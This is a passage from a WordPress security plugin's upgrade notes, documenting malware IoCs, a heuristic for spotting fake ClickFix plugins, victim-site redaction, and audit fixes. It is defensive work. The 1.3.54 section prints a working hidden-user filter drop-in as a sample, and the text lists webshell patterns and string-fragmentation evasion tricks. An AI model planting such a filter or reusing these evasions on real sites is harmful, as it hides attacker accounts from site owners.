8. PHP parser fallback passes on all 19 PHP files.
9. `WPS_Indicators::INDICATOR_VERSION` is `1.3.61-1`.

## From 1.3.59 to 1.3.60+

Version 1.3.60 is a documentation-only release with no code changes.

The motivation. A protocol-compliance audit run against the WordPress security audit YAML's `public-disclosure-guidance` section found that all five victim-site domain names were named explicitly across the four public-facing documentation files: `readme.txt`, `doc/changelog.md`, `doc/upgrading.md`, and `doc/ssot.md`. The protocol's guidance is to avoid customer data, private file paths from production, and unpatched third-party details beyond responsible disclosure requirements in public documentation. The five named domains are the operator's own sites and so are not customer data in the strictest sense, but the explicit listing publishes a connection between the operator's network and a malware compromise that any reader of the public docs would be able to trace back. The disclosure gap created several concerns. Privacy: anyone reading the public docs learns the operator owns these five sites and they were all compromised. Operational targeting: a reader sees the network mapped out, sees the specific malware family that succeeded against this network, and gets a roadmap for re-targeting. Reputation: even after cleanup, public records linking the sites to a compromise persist. The 1.3.56 naming correction (operator-target -> victim-site) made the labels clearer but did not remove the domains from the catalogue.

What 1.3.60 changes. Public documentation files replace explicit domain names with positional references that preserve the forensic context without naming the operator's network. The mapping is canonical, by date of catalogue entry: the first victim site in the captured corpus is the one captured at 1.3.44, the second is the one captured at 1.3.49, the third and fourth are inferred from the 1.3.45 cert-check.php sample set, the fifth is the one captured at 1.3.55. Per-build attributions in older changelog entries (parenthetical forms naming a domain) become "(the Nth victim site's build)". The thematic descriptor that previously identified the network's content category becomes "sites within a coherent thematic cluster"; the forensic insight that the operator chain runs theme-targeted campaigns rather than opportunistic infection is preserved without identifying the specific theme. Forensic timing context like "(captures from 1.3.44, 1.3.49, 1.3.55)" stays intact because the version markers identify the captures uniquely without identifying the targets.

What 1.3.60 does NOT change.

`includes/class-wps-indicators.php`: `WPS_Indicators::known_rat_victim_sites()` retains the five explicit domain entries. The XOR-seed extraction logic in `WPS_Scanner::extract_rat_victim_site()` performs domain-string matching against this list at runtime to identify which victim a captured RAT binary was built against. The function cannot work without the literal domain values present in the lookup table. The 1.3.56 explanatory comment block adjacent to the accessor (documenting that the list is identification-only and never used as a blocklist) stays in place and continues to be the authoritative documentation of why these domains are present in code.

`includes/class-blocker.php`: inline source comments adjacent to per-victim hash entries in `get_blocked_hashes()` retain domain attributions. These are technical annotations a reader of the source code sees when investigating a hash entry, not public-facing prose. The protocol's `public-disclosure-guidance` is concerned with what gets published in changelogs, readmes, and similar public surfaces. Source-code comments are not public documentation in the protocol's sense; they are the kind of technical annotation that any operator with the source code already has access to. Removing them would make the hash entries opaque and hurt the operator's ability to investigate future captures against the existing catalogue.

All detection-capability code is unchanged. `check_well_known_php()`, `check_clickfix_shape_heuristic()`, the family content-signature scanner, the `.well-known/` walker, the upload-guard hash blocklist all behave identically. The shape heuristic from 1.3.58 still scores ClickFix-shaped fake plugin folders against six structural traits. The fifth-victim sibling-location hash from 1.3.59 is still in the blocked-hashes list. No behavioural change at all.

The 1.3.60 indicator version bump on a docs-only release is intentional. The protocol's `versioning-and-documentation.trigger-conditions.documentation-update-required-when` clause is satisfied (the docs change is non-trivial and tracks a security-relevant decision). Bumping the indicator version makes the redaction visible to operators who inspect the plugin's reported state via Diagnostics.

Acceptance criteria for 1.3.60:

1. The four public-facing documentation files (`readme.txt`, `doc/changelog.md`, `doc/upgrading.md`, `doc/ssot.md`) contain zero explicit references to any of the five victim-site domain names.
2. The two code files (`includes/class-wps-indicators.php` and `includes/class-blocker.php`) retain explicit domain references where functionally required for XOR-seed lookup or as inline technical annotations adjacent to hash entries.
3. The protocol-compliance decision (redact in public docs, keep in code) is recorded explicitly in `doc/ssot.md` so future audits do not relitigate the question.
4. PHP parser fallback passes on all 19 PHP files.
5. `WPS_Indicators::INDICATOR_VERSION` is `1.3.60-1`.

## From 1.3.58 to 1.3.59+

Version 1.3.59 is a single-hash IoC catalogue update. A new wp-locale-handler RAT family build was captured at `.well-known/pki-validation/cert-check.php` with XOR seed for the fifth victim site and added to `WPS_Blocker::get_blocked_hashes()` as MD5 `c053446a3916beb41df3e3428c085a3c` and SHA-256 `0c1d67c3d5036b5ced4f761d05326b8a3e98946ca89fb5fc0bd276c0b095cff0`.

Why this hash matters less than its position in the catalogue might suggest. The captured file was already caught by existing detection layers, independent of the hash entry. The 1.3.45+ `WPS_Scanner::check_well_known_php()` flags any PHP file in `.well-known/` at critical severity with auto_delete enabled, because the IETF `.well-known/` is meant for static text files only and PHP execution there is illegitimate by definition. The family content-signature scanner additionally fires on the HMAC seed `a3f8b2c1d4e5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930a1b2c3d4e` and the base64 harvester markers `Ci8vIFdvcmRQcmVzcyBTZXNzaW9uIENhY2hlIEhhbmRsZXIK` and `Ci8vIFdvcmRQcmVzcyBzZXNzaW9uIGFuYWx5dGljcw`. The hash addition is defence-in-depth (faster upload-guard rejection, faster forensic identification, no need to fall back to signature scanning if the hash matches first), not the primary catch.

Why it is worth a release nonetheless. The catalogue now contains both parent-location and sibling-location builds for all five victim sites in the captured corpus. The wp-locale-handler RAT family deploys at two canonical locations per victim site: `wp-content/languages/wp-locale-handler.php` (parent, auto-loaded via the WordPress translation system) and `.well-known/pki-validation/cert-check.php` (sibling, HTTP-accessible backdoor). Both share the same per-victim XOR seed but have different stub code and therefore different hashes. Before 1.3.59 the catalogue contained the the fifth victim site parent-location build (added in 1.3.55, MD5 `70358bb32a2cf6fcbfc9edfe2848a579`) but not the sibling-location build. After 1.3.59 the catalogue is symmetric: every victim site has both location hashes catalogued.

What 1.3.59 does NOT change.

No code paths, no new checks, no auto-delete rules, no behavioural changes. The release is a single hash-line addition to `get_blocked_hashes()` plus the standard documentation updates. The XOR-seed extractor, the family signature scanner, the `.well-known/` walker all behave identically. A site that was being detected and remediated correctly under 1.3.58 will continue to be detected and remediated correctly under 1.3.59; the only observable change is that the upload-guard hash blocklist will reject this specific file at upload time without falling back to signature scanning.

Acceptance criteria for 1.3.59:

1. `WPS_Blocker::get_blocked_hashes()` contains MD5 `c053446a3916beb41df3e3428c085a3c` and SHA-256 `0c1d67c3d5036b5ced4f761d05326b8a3e98946ca89fb5fc0bd276c0b095cff0`.
2. The five victim sites each have both their parent-location wp-locale-handler.php and their sibling-location cert-check.php hashes catalogued.
3. PHP parser fallback passes on all 19 PHP files.
4. `WPS_Indicators::INDICATOR_VERSION` is `1.3.59-1`.

## From 1.3.57 to 1.3.58+

Version 1.3.58 is the inflection point on the per-prefix-versus-shape detection question for the ClickFix render-hijacker family.

The catalogue history. From 1.3.34 through 1.3.55 the IoC catalogue grew prefix-by-prefix as new ClickFix variants were captured. By 1.3.55 the slug blocklist contained fourteen prefixes (`wp-perf-analytics`, `wp-performance-analytics`, `wp-perf-monitor`, `wp-site-analytics`, `wp-page-analytics`, `wp-perf-stats`, `site-speed-insights`, `advanced-asset-insights`, `page-seo-toolkit`, `starter-image-guard`, `native-render-toolkit`, `total-render-profiler`, `total-render-toolkit`, `pro-font-optimizer`). Each new prefix required a code update: a slug entry, a suffix pattern, a hash entry, a content signature, a DB option key, an .htaccess Hardening rule. The per-prefix approach worked but it was reactive  the operator could deploy a new variant faster than the IoC catalogue could grow, and the gap between deployment and detection was the operator's window.

The 1.3.58 capture. On 2026-05-07 a fifteenth ClickFix variant was captured: `auto-content-profiler-0b8d.php` with new prefix `auto-content-profiler`, new author `Pro Team`, new class name `DB_Worker_1c49`, new DB option key `wp_e07ded4e61_cfg`, new wp_footer priority 98680. By the per-prefix model this is one more catalogue entry. By inspection of the file structure the variant introduced something more interesting: a string-fragmentation evasion technique that the content-signature scanner is partially blind to. The previous variants concatenated string literals: `'wp_p'.'erf_ok'` produced `wp_perf_ok` which any literal-substring scan could find. The new variant builds the strings in variables and concatenates the variables: the hook name `wp_footer` does not appear in the file as a literal at any point. The dismiss-cookie names `_cf_verified` and `_wp_perf_ok` are similarly fragmented. The 1.3.39+ family signature scanner is reduced to recognising only the residual literals.

What remains literal. Three things the malware cannot fragment regardless of how aggressive its evasion gets: the plugin folder slug (which must match the file basename for WordPress to load the plugin), the class declaration (PHP requires the literal `class FOO {`), and the option key it stores its config under (`update_option('wp_<10hex>_cfg', ...)` needs the literal). These three are load-bearing for the malware's own bootstrap; fragmenting them would break the malware. The heuristic in 1.3.58 targets exactly these three literals plus three orthogonal structural traits.

The six structural traits. The heuristic walks `wp-content/plugins/` non-recursively at the top level and scores each folder against the following traits.

1. Single-file plugin shape. The folder contains exactly one PHP file at `<slug>/<slug>.php` and no other files except possibly an `index.php` placeholder under 200 bytes. Real plugins almost always ship multiple files: a readme.txt for the WordPress.org repository, an /assets/ directory with screenshots and icons, a /languages/ directory with translation files, a LICENSE file, a /vendor/ directory with composer dependencies. The single-file shape is statistically rare for a legitimate plugin and is universal in the captured ClickFix corpus.

2. File size 5-15 KB. All ten captured ClickFix variants fall in this band. The lower bound rules out trivially small files (a `<?php exit;` placeholder is too small to be a render-hijacker). The upper bound rules out most legitimate plugins, which tend to be either much smaller (under 2 KB for a single-purpose helper plugin) or much larger (tens of KB once they include a settings page, dependencies, vendor code, etc.).

3. Plugin URI pointing to `developer.wordpress.org/plugins/`. Real plugins point their `Plugin URI:` header to their own homepage  the WordPress.org listing for a public plugin, the developer's company website for a private plugin, or a GitHub repository URL for an open-source plugin. The `developer.wordpress.org/plugins/` root URI is the link to the WordPress plugin developer documentation, not a plugin homepage. No legitimate plugin would use this as its own URI; copy-pasting it from the developer documentation template is a tell.

4. Single class with name pattern `[A-Z][A-Za-z_]+_[a-f0-9]{4,8}`. The captured family uses a consistent class-naming convention: a CamelCase or snake_case prefix followed by an underscore and a hex suffix. Examples: `Opt_Handler_841e`, `Render_Module_5b7d`, `DB_Worker_1c49`. Legitimate plugins rarely use hex suffixes in class names.

5. Literal `wp_<10hex>_cfg` option key. The family stores its runtime configuration under a randomised option key conforming to this regex. The 10-hex string is unique per build (`wp_b6786d21cb_cfg`, `wp_a326b31e44_cfg`, `wp_e07ded4e61_cfg`, etc.) but the surrounding `wp_..._cfg` shape is family-invariant. Cannot be fragmented because `update_option()` and `get_option()` take a string parameter that PHP must construct at the call site.

6. Late-priority `add_action` registration (numeric priority >= 50000). The family registers its render hook at very late priority specifically so its output cannot be filtered, modified, or removed by the active theme or any other plugin running on `wp_footer`. Captured priorities to date: 91411, 91734, 98680. Legitimate code rarely uses priorities this high; the WordPress core itself uses values in the 0-1000 range, and most plugins use values in the 10-100 range.

Severity mapping.

Score 5-6 traits matched -> `high` severity, `auto_delete` enabled. Confidence is very high; the combination of single-file shape, the developer.wordpress.org Plugin URI, and the wp_<10hex>_cfg option key is essentially a fingerprint, and the false-positive risk for a legitimate plugin scoring this high is negligible.

Score 4 traits matched -> `high` severity, `auto_delete` disabled (review-only). Confidence is high but not high enough for unattended deletion; the operator should verify before approving the delete.

Score 3 traits matched -> `medium` severity, `auto_delete` disabled. The folder shows partial similarity to the family but is more likely to be a legitimate niche plugin sharing some structural traits. The operator confirms or dismisses.

Score 0-2 -> no finding. Below this threshold the structural similarity to the ClickFix family is weaker than the structural similarity to a generic small plugin, and flagging would generate too many false positives.

Bonus trait. The `Author:` header is matched against a known-shell-company list: Page Software, Site Group, Dev Group, Cache Team, Pro Team, Performance Team, Optimizer Team, Web Optimizer, WP Studio. Matching the author adds a non-scoring annotation to the finding ("Author field also matches the shell-company list."). The author trait is not scored because the operator can rotate these freely, so an author match alone is not strong evidence and an author non-match is not strong counter-evidence. Recording it for context helps operator triage.

Allowlist. The heuristic skips folders matching the per-prefix slug list (already covered by the per-prefix layer; double-flagging would be noise) and skips a hardcoded allowlist of the plugin's own folder, akismet, and the `hello.php` single-file core plugin. Skipping is unconditional for these  the check does not score them at all.

Acceptance criteria for 1.3.58:

1. `WPS_Blocker::get_blocked_slugs()` contains `auto-content-profiler`.
2. `WPS_Blocker::get_blocked_path_patterns()` contains the two `/auto-content-profiler[-_][a-z0-9]{3,8}\\//i` and `\\.php$/i` patterns.
3. `WPS_Blocker::get_blocked_hashes()` contains MD5 `c87d8c472f827704a2ef6beb997729ff` and SHA-256 `d7ec2991f822bc9d8811526f83e84dad6002d8ca8471fd3a763f40252e59ea32`.
4. `WPS_Indicators::malware_option_keys()` contains `wp_e07ded4e61_cfg`.
5. `WPS_Scanner::SIGNATURES_PERF` contains `DB_Worker_1c49`.
6. `WPS_Scanner::check_clickfix_shape_heuristic()` exists and is invoked from `WPS_Scanner::run()`.
7. The heuristic flags a hypothetical future variant with prefix not in the slug list at `high` severity with `auto_delete` enabled when it scores 5+ traits.
8. The heuristic does not flag a legitimate plugin with multi-file structure and a real Plugin URI.
9. The heuristic does not flag the plugin's own self-folder (`wp-perf-shield`).
10. The heuristic skips folders whose slug already matches a per-prefix entry in `get_blocked_slugs()` (delegating to the per-prefix layer to avoid duplicate findings).
11. PHP parser fallback passes on all 19 PHP files.
12. `WPS_Indicators::INDICATOR_VERSION` is `1.3.58-1`.

## From 1.3.56 to 1.3.57+

Version 1.3.57 is the first release after a formal security audit run against the WordPress theme/plugin security audit and remediation YAML protocol. The audit catalogued six confirmed findings, of which five are fixed in code and one is a documentation clarification. Four further suspected vulnerabilities were verified as false positives. One residual risk is documented and accepted.

This release is a security patch. There are no public API changes, no breaking changes for site operators, and no breaking changes for external integrators of the plugin's classes. Operators should update to 1.3.57 promptly to receive the privilege-escalation fix in `delete_plugin_folder` and the defence-in-depth hardening across the remediation handlers.

What changed at runtime.

The most important fix is WPSEC-001. The `delete_plugin_folder` AJAX handler previously authorised deletion of any directory inside `WP_CONTENT_DIR`, including themes, uploads, mu-plugins, languages, and cache directories. The handler is named and capability-gated as a plugin-folder operation and is meant to be used only on directories under `wp-content/plugins/`. The mismatch between the capability gate (`delete_plugins`) and the containment base (`wp-content/`) is a privilege-escalation pattern: a custom-role user with only `delete_plugins` could trigger deletion of theme directories or upload directories, which require `delete_themes` and `delete_posts` respectively. In default WordPress installations admins have all capabilities so the issue does not manifest in practice, but the protocol explicitly checks for capability mismatch and the fix is straightforward: narrow the containment base to `WP_PLUGIN_DIR` so the handler authorises only what its capability gate actually claims to authorise. Theme deletion remains available through the dedicated `delete_theme_file` handler, which is gated on `edit_themes` and contains paths to the active theme and child theme directories.

The other security fix is WPSEC-002. Earlier package layouts shipped a `tools/` directory containing `update-indicators.php` and `verify-package.ps1` without a directory placeholder. If the host had Apache `Options Indexes` enabled, the directory was browsable. The PHP file was protected from web execution by `php_sapi_name() !== 'cli'` but its source code could leak; the PowerShell file was served as text (`.ps1` is not mapped to PHP execution by default) and its source was directly readable via URL request. The contents of both files are pre-release validation logic with no credentials, secrets, or sensitive paths, so the impact was low, but disclosure of internal tooling was unnecessary. The fix adds `tools/index.php` with the standard placeholder and `tools/.htaccess` with `Deny from all`.

Three further changes are defence-in-depth. WPSEC-003 extends the protected-basename list in `delete_file()` to cover `.htaccess`, `.user.ini`, `wp-cron.php`, `wp-trackback.php`, and `wp-comments-post.php`. WPSEC-004 switches all four runtime `wp_remote_get` call sites to `wp_safe_remote_get`, which blocks loopback / private-IP / metadata-IP destinations by default; no user-controlled URLs flow into these calls today, but the substitution is cheap and gives forward protection if a future change introduces user-controlled URLs. WPSEC-005 validates `$wp_version` against `^\d+\.\d+(\.\d+)?$` before interpolating it into the GitHub and SVN URLs in `clean_login` and `clean_cron`; the validation defends against the case where `wp-includes/version.php` has already been compromised by an attacker and `$wp_version` carries a path-traversal payload (a higher-privilege precondition than this AJAX handler offers anyway, but the validation is cheap).

The sixth finding (WPSEC-006) is a clarification rather than a security fix. `tools/update-indicators.php` has long carried a `TODO` placeholder URL pointing to `example.com`. The CLI-only guard prevented it from being a security issue, but operators reading the file might assume the indicator-feed mechanism was active. The release adds an explicit `STATUS: STUB` header and an early-exit guard that refuses to make any network request while the placeholder URL remains unchanged.

False positives verified.

The protocol's Phase 1 inventory surfaced 26 distinct request superglobal accesses, 278 admin-page output points, and three `$wpdb` queries that did not use `prepare()`. Phase 2 verified each as a non-issue. The three non-prepared queries (`class-forensics.php:833`, `class-remediation-controller.php:611`, `class-remediation-controller.php:625`) all use constant SQL with no interpolation of user-controlled values. The 278 output points were sampled systematically: every dynamic value flows through `esc_html`, `esc_attr`, `esc_url`, `esc_textarea`, `wp_kses`, `sanitize_html_class`, or `wp_json_encode` as appropriate. The cases that initially appeared as raw `echo $variable` without escape resolved to ternary expressions returning literal constants (e.g., `echo $bool ? '#fff' : '#000'`), helper functions that escape internally (`apply_btn()`, `badge()`), defined constants (`WPS_VERSION`), or static string echoes that the regex filter did not recognise as such. The 26 AJAX handlers were enumerated and each was verified to invoke `WPS_Utils::guard_request()` with an appropriate capability before any state change. The settings sanitisation chain was traced from `$_POST` through `sanitize_slug_list()` and `sanitize_hash_list()` to downstream consumers in `class-blocker.php` and `class-admin-settings.php`; the `sanitize_title()` and strict-hex-regex primitives are correct and the output context (`esc_textarea` in the form re-render) is correct.

Residual risks.

One residual risk is documented and accepted: the `delete_file` AJAX handler authorises deletion of any file inside `ABSPATH` except the protected basename list (now extended via WPSEC-003 from 5 entries to 10). Under WordPress's `manage_options` threat model this is consistent — admins are super-users on a single-site WordPress install and can do nearly anything via the dashboard already. The residual risk applies only when an admin session is compromised through a separate vulnerability (XSS bypassing nonce, session theft, malware on the admin's machine); in those scenarios the attacker has many other attack paths inside WordPress and `delete_file` is not a unique hazard. The handler cannot be removed entirely because malware deletion is the plugin's primary purpose.

Acceptance criteria for 1.3.57:

1. `WPS_Remediation_Controller::delete_plugin_folder()` containment base is `WP_PLUGIN_DIR`, not `WP_CONTENT_DIR`. A path under `wp-content/themes/`, `wp-content/uploads/`, `wp-content/mu-plugins/`, `wp-content/languages/`, or any other non-plugins directory under `wp-content/` is rejected with the error message `"Safety check failed: path is outside wp-content/plugins/."`
2. `WPS_Remediation_Controller::delete_file()` protected basename list contains at minimum: `wp-config.php`, `wp-load.php`, `wp-settings.php`, `wp-blog-header.php`, `index.php`, `.htaccess`, `.user.ini`, `wp-cron.php`, `wp-trackback.php`, `wp-comments-post.php`.
3. All runtime `wp_remote_get` call sites have been replaced with `wp_safe_remote_get`. `grep "wp_remote_get\b" includes/*.php` returns zero matches outside comments.
4. `clean_login` and `clean_cron` validate `$wp_version` against `^\d+\.\d+(\.\d+)?$` before interpolating it into any URL.
5. `tools/index.php` exists with the `<?php // Silence is golden.` placeholder. `tools/.htaccess` exists with `Deny from all`.
6. `tools/update-indicators.php` exits with status code 2 and a STUB error message when invoked while the `$feedUrl` still contains `example.com`.
7. `doc/ssot.md` contains a Security Audit History section with the 1.3.57 audit summary table.
8. PHP parser fallback passes on all 19 PHP files.
9. Behavioural regression test for delete_plugin_folder containment passes 7/7 assertions.
10. `WPS_Indicators::INDICATOR_VERSION` is `1.3.57-1`.

## From 1.3.55 to 1.3.56+

Version 1.3.56 is a naming correction. A site operator reviewing the 1.3.55 release flagged that the IoC catalogue used the term "operator target" in a way that read backwards. The list at `WPS_Indicators::known_rat_operator_targets()` contained five domains extracted from XOR seeds inside captured RAT binaries; every entry is a victim site (a domain owned by a site operator whose installation has been compromised by this RAT family), not attacker infrastructure. The label "operator target" is genuinely ambiguous: it could mean "target FOR the operator" (correct, victim) or "target OWNED BY the operator" (incorrect, attacker domain). The natural reading is the second one, which inverted the semantics. The rename eliminates the ambiguity.

The correction matters more than a typical naming change because the affected data is a list of real-world domains belonging to real site operators. A reader looking at any of the per-release docs (1.3.45, 1.3.49, 1.3.55) could plausibly conclude the listed domains were attacker-controlled infrastructure and reach incorrect operational conclusions  for example, deciding to treat traffic from those domains as suspicious, or assuming the listed sites were complicit in the attack chain. Both inferences are wrong. The domains are exactly as innocent as the operator's own site is. They are co-victims.

What 1.3.56 does.

`WPS_Indicators::known_rat_operator_targets()` is renamed to `WPS_Indicators::known_rat_victim_sites()`. The semantic content is unchanged; the same five domains are returned. The old method name is retained as a `@deprecated` backward-compatibility alias that calls through to the new name. Any external integrator using the old API continues to work without modification.

`WPS_Scanner::extract_rat_operator_target()` is renamed to `WPS_Scanner::extract_rat_victim_site()`. Same alias pattern. The function still extracts the same XOR seed from captured binaries by the same mechanism.

The finding-shape annotation key produced by `check_well_known_php()` changes from `[target=<domain>]` to `[victim_site=<domain>]`. The action text is rewritten from "polymorphic variant targeting <domain>" to "polymorphic variant customised against the victim site <domain>." The reader of an admin alert no longer needs to reason about whether `target` means a victim or an attacker; the field is now self-explanatory.

A prominent comment block at `known_rat_victim_sites()` makes two clarifications explicit. First: every entry is a victim site, never attacker infrastructure. Second: the list is for identification only and is never used by the plugin for blocking, blacklisting, filtering, deny-list enforcement, or any other restrictive purpose. A codebase grep at the time of release confirmed zero call sites use this list as a blocklist input. The list serves exactly one function  translating the XOR seed of a captured RAT binary into a human-readable victim-site name for forensic annotation in admin findings.

Two further comment blocks in `class-blocker.php` and `class-scanner.php` referred to "operator-target" terminology and were rewritten. One fragment said "the operator gets a custom binary"  this was misleading (the operator builds the binary; the binary is keyed against the victim) and is now rewritten to "each victim site receives a custom-built binary keyed against its own domain."

What 1.3.56 does NOT do.

No detection-logic change. The rename is purely semantic. The XOR-seed extractor still works the same way; the finding fields still carry the same domain string; captured binaries are still correctly identified. The data flow from `extract_rat_victim_site()` through the finding shape to the admin email is identical to the data flow that previously went through `extract_rat_operator_target()`.

No data change. The same five domains remain in the list. The release does not add or remove any victim-site entries. The five domains are: the five victim sites in the captured corpus. Each was previously listed; each remains listed.

No removal of the deprecated names. The aliases `known_rat_operator_targets()` and `extract_rat_operator_target()` continue to work via call-through to the new methods. Removal would be a breaking change for any external integrator currently using the old names. The deprecation can be enforced with a `_deprecated_function()` warning in a future release if usage telemetry indicates that's safe.

Acceptance criteria:

1. `WPS_Indicators::known_rat_victim_sites()` exists, returns the same five-element list previously returned by `known_rat_operator_targets()`.
2. `WPS_Indicators::known_rat_operator_targets()` exists as a deprecated alias and returns identical data via call-through.
3. `WPS_Scanner::extract_rat_victim_site()` exists with the same parameter signature and return semantics as the previous `extract_rat_operator_target()`.
4. `WPS_Scanner::extract_rat_operator_target()` exists as a deprecated alias and returns identical data via call-through.
5. `WPS_Scanner::check_well_known_php()` uses `extract_rat_victim_site()` (the new name) for the call site, and the finding annotation key is `[victim_site=<domain>]`.
6. The comment block at `known_rat_victim_sites()` explicitly states the list is for identification only and never used for blocking.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.56-1`.

## From 1.3.54 to 1.3.55+

Version 1.3.55 is a single-line intelligence catalogue update. A re-upload of `wp-locale-handler.php` (the parent RAT in the v1.7 family) was already in the upload-guard hash list with MD5 `70358bb32a2cf6fcbfc9edfe2848a579`. The existing detection caught it correctly. The XOR seed inside the binary, however, was the fifth victim site  a fifth operator-target domain that had not yet been added to the `known_rat_operator_targets()` accessor.

Why the operator-target accessor matters. Each captured RAT v1.7 binary is built per-victim: the operator chain runs an XOR encoding pass that uses the victim site's domain as the seed. The seed is recoverable from the binary by the existing `WPS_Scanner::extract_rat_operator_target()` (added in 1.3.45), which iterates the known-target list and tries each one against the XOR-encoded credential-harvester payload until one matches. A target in the accessor produces a positive identification; a target absent from the accessor leaves the binary as "unknown campaign target" even when the operator-chain fingerprint clearly identifies the family. Adding the new target to the list closes that identification gap for future captures from this exact campaign.

The accessor now lists five domains. Three are confirmed-active (we have captured binaries for the first, second, and fifth victim sites at 1.3.44, 1.3.49, and 1.3.55 respectively). Two are inferred from the operator-target lookup table embedded in the captured cert-check.php sample set (the third and fourth victim sites, both from 1.3.45)  the operator chain was preparing binaries for these targets but no executed binary was yet captured.

What 1.3.55 does NOT change. No detection logic, no new checks, no auto-delete rules, no acceptance criteria for runtime behaviour. The release is a one-line entry in `WPS_Indicators::known_rat_operator_targets()`. The captured wp-locale-handler.php sample was already detected correctly by every existing layer; the upload provided campaign intelligence rather than threat-detection requirements.

Acceptance criteria:

1. `WPS_Indicators::known_rat_operator_targets()` returns at minimum five entries including the fifth victim site.
2. PHP parser fallback passes on all 19 PHP files.
3. `WPS_Indicators::INDICATOR_VERSION` is `1.3.55-1`.

## From 1.3.53 to 1.3.54+

Version 1.3.54 closes a coverage gap that surfaced from a benign upload, not a malicious one. After 1.3.53 captured the wp-security-helper filter installer and surfaced the user-hiding mechanism, an operator reviewing their attack surface uploaded their wp-content/object-cache.php and wp-content/maintenance.php drop-ins for verification. Both turned out to be legitimate (Performance Lab + Plesk WP Toolkit). The interesting question was whether the existing detection layers actually had the drop-in attack surface covered  and the honest answer was "partially, by accident, not by design."

What WordPress drop-ins are. Drop-ins are PHP files at canonical names under wp-content/. Each file has exactly one functional purpose, recognised by WordPress core and loaded at a specific stage of the bootstrap sequence:

| File | Loaded at | Purpose |
|---|---|---|
| `object-cache.php` | very early (before plugins) | Replaces WP's built-in `WP_Object_Cache` with a persistent backend |
| `advanced-cache.php` | very early | Page cache implementation |
| `db.php` | very early | Replaces WP's built-in `wpdb` class |
| `db-error.php` | on DB connection failure | Custom error page |
| `maintenance.php` | when `.maintenance` exists | Custom maintenance-mode page |
| `fatal-error-handler.php` | very early | Custom fatal-error UI/logging |
| `install.php` (under wp-content/) | first install only | Custom install routine |
| `php-error.php` | on PHP fatal | Custom fatal-error display |
| `sunrise.php` | very early on multisite | Multisite domain mapping |

The "very early" loading stage matters for security. Drop-ins execute before the WordPress plugin loader runs. This means a backdoor installed as a drop-in runs before any security plugin (including WP Perf Shield itself) gets a chance to register hooks, scan files, or check anything. A drop-in can install filters, bypass authentication, exfiltrate credentials, or hide users  and the security plugin that would otherwise detect those activities does not see them happen because the security plugin is not loaded yet.

What the existing detection layers covered. The 1.3.46 generic-webshell pattern scanner walks ABSPATH (which includes wp-content/) and matches against five high-confidence pattern shapes: `eval($_POST...)`, `assert($_GET...)`, `eval(base64_decode(...))`, `include $_USERINPUT`, and `preg_replace` with the `/e` modifier. A drop-in containing any of these shapes would be flagged. The 1.3.43 dropper-cache walker catches known-bad basenames at any wp-content/ path, which would catch a drop-in named with one of the IoC-list filenames. Both checks are useful but neither is drop-in-aware.

The gap the 1.3.54 batch revealed. Consider a drop-in that uses original code with no obvious malware shapes:

```php
<?php
defined('ABSPATH') || exit;
class Custom_Cache_Layer {
    public function __construct() {
        add_action('plugins_loaded', [$this, 'install_hooks']);
    }
    public function install_hooks() {
        add_filter('pre_user_query', [$this, 'redirect_users']);
    }
    public function redirect_users($q) {
        global $wpdb;
        $q->query_where .= " AND ID NOT IN (47, 53)";
    }
}
new Custom_Cache_Layer();
```

This is a hidden-user filter installer. It contains no `eval`, no `base64_decode`, no `preg_replace /e`, no known-bad string. The 1.3.46 webshell scanner would not flag it. It is at `wp-content/db.php` (a canonical drop-in path) so 1.3.43 dropper-cache does not flag it (the basename is not in the IoC list because `db.php` is a legitimate drop-in name). The 1.3.52 hidden-admin-user check would catch the SYMPTOM (the user is hidden from `get_users()`) but only after the filter has already been running. Nothing in the file-based detection chain catches the file itself.

What 1.3.54 ships.

`WPS_Scanner::check_drop_ins()` walks the canonical drop-in paths under wp-content/. For each file present, it matches the contents against `WPS_Scanner::known_drop_in_publishers()`, which is a substring -> publisher-label map covering the major drop-in publishers in the WordPress ecosystem: Performance Lab, Plesk WP Toolkit, W3 Total Cache, WP Super Cache, LiteSpeed Cache, Redis Object Cache, WP-Optimize, Memcached Object Cache, Batcache, Hummingbird Performance, SG Optimizer, Cloudflare APO, Pantheon, plus WordPress core's default fatal-error-handler. The substrings are conservative: short enough to survive minor publisher version changes, long enough that legitimate-non-publisher code is unlikely to contain them.

Drop-ins matching one of the publisher signatures pass silently. Drop-ins matching no publisher produce a finding at `medium` severity. The action text frames both possibilities: a custom drop-in deliberately installed by the operator (rare but valid; signature can be added to the allowlist via a code update), or a planted backdoor (extremely common malware persistence vector). Operator inspection is recommended before deletion. No `auto_delete`: removing a legitimate cache drop-in reverts performance optimisations, and the false-positive risk on a less-common publisher justifies operator review.

The signature list is maintained as a private internal allowlist rather than a public IoC accessor because it is allowlist data, not threat intelligence. Adding new publishers to the list is a routine code change when an operator surfaces a known-good drop-in that does not yet have coverage.

What 1.3.54 does NOT add.

Hash-based allowlisting was considered and rejected. Each publisher's drop-in changes hash with every minor version release, so a hash-based allowlist would either need constant maintenance (impractical) or be too permissive once any version had been seen. Substring-based allowlisting against publisher self-identification strings is the correct primitive; it survives version changes for the same publisher.

A drop-in-specific recursion limit was considered and rejected. The check is non-recursive: it visits exactly one canonical path per drop-in name, not a recursive walk. Recursion would not add coverage (drop-ins live at exactly one path each by WordPress design) and would expand the false-positive surface to anything in subdirectories.

Auto-delete on unknown drop-ins was considered and rejected, as noted. The combination of (a) legitimate custom drop-ins existing, (b) drop-ins from less-common publishers, (c) the cost of accidentally removing a cache drop-in, and (d) the modest detection benefit of auto-delete given that the operator should be reviewing drop-ins anyway given their high-attack-surface nature  all argue for review-only.

Acceptance criteria:

1. `WPS_Scanner::run()` calls `check_drop_ins()` between `check_hidden_admin_users()` and `check_malicious_db_options()`.
2. `WPS_Scanner::DROP_IN_CANONICAL_NAMES` contains all nine canonical drop-in basenames.
3. `WPS_Scanner::known_drop_in_publishers()` returns at minimum: Performance Lab, Plesk WP Toolkit, W3 Total Cache, WP Super Cache, LiteSpeed Cache, Redis Object Cache, WP-Optimize, plus WordPress core's fatal-error-handler.
4. A drop-in matching any publisher signature does not produce a finding.
5. A drop-in matching no publisher signature produces a `medium` finding with no `auto_delete`.
6. A site with no drop-ins at all produces zero findings.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.54-1`.

## From 1.3.52 to 1.3.53+

